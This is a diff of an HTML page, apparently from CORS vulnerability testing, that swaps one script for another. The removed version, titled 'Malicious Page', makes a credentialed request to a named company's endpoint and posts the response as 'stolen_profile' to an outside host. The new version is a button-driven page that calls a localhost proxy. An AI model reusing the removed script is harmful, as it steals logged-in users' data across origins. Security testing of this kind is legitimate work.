@@ -1,30 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Malicious Page</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CORS Proxy Example</title>
 </head>
 <body>
-<h1>Welcome to My Page</h1>
 
-<script>
-    // 1. Send a request to the vulnerable endpoint to extract sensitive data
-    fetch('https://certinia.com/cdn-cgi/rum?', {
-        method: 'POST',
-        credentials: 'include',
-        headers: { 'Content-Type': 'application/json' }
-    })
-    .then(response => response.json())
-    .then(data => {
-        // 2. Send the stolen data to the attacker's server
-        fetch('https://devadathappu.github.io/corsvu/', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ stolen_profile: data })
+  <h1>Testing CORS Proxy</h1>
+  <button id="fetchButton">Fetch Data</button>
+  
+  <!-- Section to display the data -->
+  <div id="output">
+    <h2>Response Data:</h2>
+    <pre id="responseData"></pre>
+  </div>
+
+  <script>
+    // Client-side script to call the proxy server
+    const proxyUrl = 'http://localhost:8082/';
+    const targetUrl = 'https://certinia.com/cdn-cgi/rum?';
+
+    document.getElementById('fetchButton').addEventListener('click', function() {
+      fetch(proxyUrl + targetUrl)
+        .then(response => response.json()) // Assuming JSON response
+        .then(data => {
+          console.log('Response Data:', data);
+          
+          // Display the data on the page
+          const responseData = document.getElementById('responseData');
+          responseData.textContent = JSON.stringify(data, null, 2); // Format the JSON data
+        })
+        .catch(error => {
+          console.error('Error:', error);
         });
-    })
-    .catch(error => console.error('Error:', error));
-</script>
+    });
+  </script>
 
 </body>
 </html>
